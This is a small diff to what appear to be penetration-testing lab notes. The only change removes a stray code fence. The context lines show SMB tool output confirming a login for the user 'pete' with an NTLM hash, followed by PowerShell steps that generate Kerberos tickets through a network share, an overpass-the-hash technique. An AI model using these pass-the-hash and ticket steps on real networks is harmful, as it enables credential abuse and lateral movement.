@@ -1804,7 +1804,6 @@ SMB         10.11.1.21      445    SV-FILE01        svcorp\pete
 SMB         10.11.1.20      445    SV-DC01          [+] svcorp.com\pete:0f951bc4fdc5dfcd148161420b9c6207
 ````
 ````
-````
 PS> klist # should show no TGT/TGS
 PS> net use \\SV-FILE01 (try other comps/targets) # generate TGT by authN to network share on the computer
 PS> klist # now should show TGT/TGS
